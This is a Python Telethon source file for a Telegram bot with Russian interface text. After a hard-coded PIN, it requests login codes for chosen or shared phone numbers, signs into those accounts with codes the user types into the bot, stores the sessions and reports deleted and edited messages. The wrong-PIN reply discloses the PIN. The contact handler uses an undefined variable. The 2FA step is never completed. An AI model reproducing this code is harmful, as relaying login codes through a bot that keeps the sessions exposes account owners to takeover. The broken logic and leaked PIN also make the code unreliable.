import os
import asyncio
import logging
from datetime import datetime, timedelta
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneCodeExpiredError,
    FloodWaitError
)
from telethon.tl.custom import Button
import nest_asyncio

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

bot = TelegramClient('bot', API_ID, API_HASH)

# ========== ХРАНИЛИЩЕ ==========
user_sessions = {}
authorized_users = set()
ACCESS_PIN = "5482"
message_cache = {}
user_clients = {}
timers = {}  # {user_id: {'message': msg, 'end_time': datetime, 'task': task}}
flood_until = {}  # {user_id: datetime}

# 5 СОХРАНЁННЫХ НОМЕРОВ
SAVED_PHONES = [
    "+79001234567",  # Номер 1
    "+79007654321",  # Номер 2
    "+79001112233",  # Номер 3
    "+79004445566",  # Номер 4
    "+79007778899"   # Номер 5
]

# ========== ФУНКЦИЯ ТАЙМЕРА РАЗБЛОКИРОВКИ (ОБНОВЛЕНИЕ КАЖДУЮ СЕКУНДУ) ==========
async def show_unlock_timer(event, user_id, seconds):
    """Показывает таймер разблокировки с обновлением каждую секунду"""
    
    msg = await event.reply("🦆 **⏳ Загружаю таймер...**")
    
    unlock_time = datetime.now() + timedelta(seconds=seconds)
    flood_until[user_id] = unlock_time
    
    # Запускаем бесконечное обновление
    while datetime.now() < unlock_time:
        remaining = int((unlock_time - datetime.now()).total_seconds())
        hours = remaining // 3600
        minutes = (remaining % 3600) // 60
        secs = remaining % 60
        
        # Создаём визуальный прогресс-бар
        total = seconds
        progress = int(((seconds - remaining) / seconds) * 20)
        bar = '█' * progress + '░' * (20 - progress)
        
        try:
            await msg.edit(
                f"🦆 **🔒 НОМЕР ЗАБЛОКИРОВАН**\n\n"
                f"⏱ **До разблокировки:**\n"
                f"**{hours:02d}:{minutes:02d}:{secs:02d}**\n"
                f"└ {bar}\n\n"
                f"📱 **Номер:** {SAVED_PHONES[user_id % 5] if user_id in flood_until else 'Неизвестно'}\n"
                f"❌ Слишком много попыток входа\n\n"
                f"👇 **Кнопки:**",
                buttons=[
                    [Button.text("🔄 Проверить статус")],
                    [Button.text("📞 Отправить контакт")],
                    [Button.text("🔙 Назад")]
                ]
            )
        except:
            pass
        
        await asyncio.sleep(1)  # ЖДЁМ 1 СЕКУНДУ
    
    # Когда время вышло
    await msg.edit(
        f"🦆 **✅ НОМЕР РАЗБЛОКИРОВАН!**\n\n"
        f"Теперь можно войти заново.\n"
        f"Нажми /start",
        buttons=[
            [Button.text("🔄 Начать заново")],
            [Button.text("📞 Отправить контакт")]
        ]
    )
    
    if user_id in flood_until:
        del flood_until[user_id]

# ========== ФУНКЦИЯ ТАЙМЕРА КОДА (2 МИНУТЫ) ==========
async def start_code_timer(user_id, chat_id, seconds=120):
    """Запускает таймер на ввод кода (обновление каждую секунду)"""
    
    msg = await bot.send_message(
        chat_id,
        f"🦆 **⏳ Код отправлен!**\n\n"
        f"⏱ **{seconds//60}:{seconds%60:02d}**\n"
        f"└ {'█' * 10}░░\n\n"
        f"📨 Проверь Telegram"
    )
    
    timers[user_id] = {
        'message': msg,
        'end_time': datetime.now() + timedelta(seconds=seconds),
        'running': True
    }
    
    for i in range(seconds):
        if not timers.get(user_id, {}).get('running'):
            break
            
        remaining = seconds - i
        minutes = remaining // 60
        secs = remaining % 60
        progress = int((i / seconds) * 20)
        bar = '█' * progress + '░' * (20 - progress)
        
        try:
            await msg.edit(
                f"🦆 **⏳ Код действителен**\n\n"
                f"⏱ **{minutes}:{secs:02d}**\n"
                f"└ {bar}\n\n"
                f"✍️ **Введи код:**"
            )
        except:
            pass
        
        await asyncio.sleep(1)
    
    if timers.get(user_id, {}).get('running'):
        await msg.edit(
            "🦆 **⌛ ВРЕМЯ ВЫШЛО!**\n\n"
            "Код больше недействителен.\n"
            "Нажми /start чтобы начать заново."
        )
    
    if user_id in timers:
        del timers[user_id]

def stop_timer(user_id):
    """Останавливает таймер"""
    if user_id in timers:
        timers[user_id]['running'] = False
        del timers[user_id]

# ========== ОСНОВНОЙ ОБРАБОТЧИК ==========
@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.message.text.strip()

    # === ПРОВЕРКА БЛОКИРОВКИ ===
    if user_id in flood_until and datetime.now() < flood_until[user_id]:
        remaining = int((flood_until[user_id] - datetime.now()).total_seconds())
        await show_unlock_timer(event, user_id, remaining)
        return

    # === ПИН-КОД ===
    if user_id not in authorized_users:
        if text == ACCESS_PIN:
            authorized_users.add(user_id)
            await show_main_menu(event)
        else:
            await event.reply(f"🦆 **Неверный пин-код!**\nВведи: `5482`")
        return

    # === ГЛАВНОЕ МЕНЮ ===
    if text == "/start" or text == "🔙 Назад" or text == "🔄 Начать заново":
        await show_main_menu(event)
        return

    # === ПРОВЕРКА СТАТУСА ===
    if text == "🔄 Проверить статус":
        if user_id in flood_until:
            remaining = int((flood_until[user_id] - datetime.now()).total_seconds())
            await show_unlock_timer(event, user_id, remaining)
        else:
            await event.reply(
                f"🦆 **✅ Номер не заблокирован**\n\n"
                f"Можно входить!",
                buttons=[
                    [Button.text("📞 Выбрать номер")],
                    [Button.text("🔙 Назад")]
                ]
            )
        return

    # === ОТПРАВИТЬ КОНТАКТ ===
    if text == "📞 Отправить контакт":
        await event.reply(
            f"🦆 **📱 Поделись контактом**\n\n"
            f"Нажми кнопку ниже, чтобы отправить номер:",
            buttons=[[Button.request_contact("📞 Поделиться контактом")]]
        )
        return

    # === ВЫБОР НОМЕРА ===
    if text == "📞 Выбрать номер":
        await show_phone_menu(event)
        return

    # === ВЫБОР СОХРАНЁННОГО НОМЕРА ===
    if text == "📞 1️⃣ +7 900 123 45 67":
        await process_phone(event, user_id, SAVED_PHONES[0])
        return
    elif text == "📞 2️⃣ +7 900 765 43 21":
        await process_phone(event, user_id, SAVED_PHONES[1])
        return
    elif text == "📞 3️⃣ +7 900 111 22 33":
        await process_phone(event, user_id, SAVED_PHONES[2])
        return
    elif text == "📞 4️⃣ +7 900 444 55 66":
        await process_phone(event, user_id, SAVED_PHONES[3])
        return
    elif text == "📞 5️⃣ +7 900 777 88 99":
        await process_phone(event, user_id, SAVED_PHONES[4])
        return

    # === ОБРАБОТКА КОДА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_code':
        await process_code(event, user_id, text)
        return

async def show_main_menu(event):
    """Показывает главное меню"""
    await event.reply(
        f"🦆 **Добро пожаловать!**\n\n"
        f"👇 **Выбери действие:**",
        buttons=[
            [Button.text("📞 Выбрать номер")],
            [Button.text("📞 Отправить контакт")],
            [Button.text("🔄 Проверить статус")]
        ]
    )

async def show_phone_menu(event):
    """Показывает меню выбора номера"""
    await event.reply(
        f"🦆 **📱 Выбери номер:**",
        buttons=[
            [Button.text("📞 1️⃣ +7 900 123 45 67")],
            [Button.text("📞 2️⃣ +7 900 765 43 21")],
            [Button.text("📞 3️⃣ +7 900 111 22 33")],
            [Button.text("📞 4️⃣ +7 900 444 55 66")],
            [Button.text("📞 5️⃣ +7 900 777 88 99")],
            [Button.text("🔙 Назад")]
        ]
    )

async def process_phone(event, user_id, phone):
    """Обрабатывает номер и отправляет код"""
    user_sessions[user_id] = {
        'phone': phone,
        'step': 'waiting_code'
    }
    
    msg = await event.reply("🦆 **⏳ Отправляю код...**")
    
    try:
        client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        
        user_sessions[user_id]['client'] = client
        user_sessions[user_id]['code_hash'] = sent_code.phone_code_hash
        
        await msg.edit("🦆 **✅ Код отправлен!**")
        
        # Запускаем таймер на 2 минуты
        await start_code_timer(user_id, event.chat_id, 120)
        
    except FloodWaitError as e:
        seconds = e.seconds
        await show_unlock_timer(event, user_id, seconds)
        if user_id in user_sessions:
            del user_sessions[user_id]
        
    except Exception as e:
        await msg.edit(f"🦆 **❌ Ошибка:** {e}")
        if user_id in user_sessions:
            del user_sessions[user_id]

async def process_code(event, user_id, code):
    """Обрабатывает введённый код"""
    session = user_sessions[user_id]
    client = session['client']
    
    stop_timer(user_id)
    
    msg = await event.reply("🦆 **🔑 Проверяю код...**")
    
    try:
        await client.sign_in(session['phone'], code, phone_code_hash=session['code_hash'])
        
        me = await client.get_me()
        await msg.edit(
            f"🦆 **✅ Успешный вход!**\n\n"
            f"👤 Аккаунт: @{me.username}\n"
            f"🆔 ID: {me.id}\n\n"
            f"🔍 **Мониторинг запущен!**"
        )
        
        if user_id in user_sessions:
            del user_sessions[user_id]
        
        asyncio.create_task(monitor_user_chats(user_id, client))
        
    except SessionPasswordNeededError:
        user_sessions[user_id]['step'] = 'waiting_2fa'
        await msg.edit("🦆 **🔐 Требуется пароль 2FA.**\n\nВведи пароль:")
        
    except PhoneCodeInvalidError:
        await msg.edit("🦆 **❌ Неверный код!**\n\nПопробуй ещё раз:")
        user_sessions[user_id]['step'] = 'waiting_code'
        await start_code_timer(user_id, event.chat_id, 120)
        
    except PhoneCodeExpiredError:
        await msg.edit("🦆 **⌛ Код истёк.**\n\nНачни заново.")
        if user_id in user_sessions:
            del user_sessions[user_id]
        
    except Exception as e:
        await msg.edit(f"🦆 **❌ Ошибка:** {e}")
        if user_id in user_sessions:
            del user_sessions[user_id]

# === ОБРАБОТКА ПОЛУЧЕННОГО КОНТАКТА ===
@bot.on(events.NewMessage(func=lambda e: e.message.contact))
async def contact_handler(event):
    user_id = event.sender_id
    contact = event.message.contact
    
    await event.reply(
        f"🦆 **📱 Контакт получен!**\n\n"
        f"Номер: `{contact.phone_number}`\n"
        f"Имя: {contact.first_name}\n\n"
        f"Использовать для входа?",
        buttons=[
            [Button.text("✅ Да, войти")],
            [Button.text("❌ Нет, отмена")]
        ]
    )
    
    user_contacts[user_id] = contact.phone_number

@bot.on(events.NewMessage)
async def confirm_contact_handler(event):
    user_id = event.sender_id
    text = event.message.text
    
    if text == "✅ Да, войти" and user_id in user_contacts:
        await process_phone(event, user_id, user_contacts[user_id])
    elif text == "❌ Нет, отмена":
        await event.reply("🦆 **❌ Отменено**")

# === МОНИТОРИНГ ===
async def monitor_user_chats(user_id, client):
    await bot.send_message(user_id, "🦆 **🔍 Мониторинг запущен!**")
    
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        await bot.send_message(user_id, f"🦆 **🗑 Удалено** {len(event.deleted_ids)} сообщений")
    
    @client.on(events.MessageEdited)
    async def on_edit(event):
        await bot.send_message(user_id, f"🦆 **✏️ Изменено** сообщение")
    
    await client.run_until_disconnected()

# === ЗАПУСК ===
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Бот @{me.username} запущен! Пин-код: 5482")
    logger.info(f"⏳ Таймеры обновляются каждую секунду")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())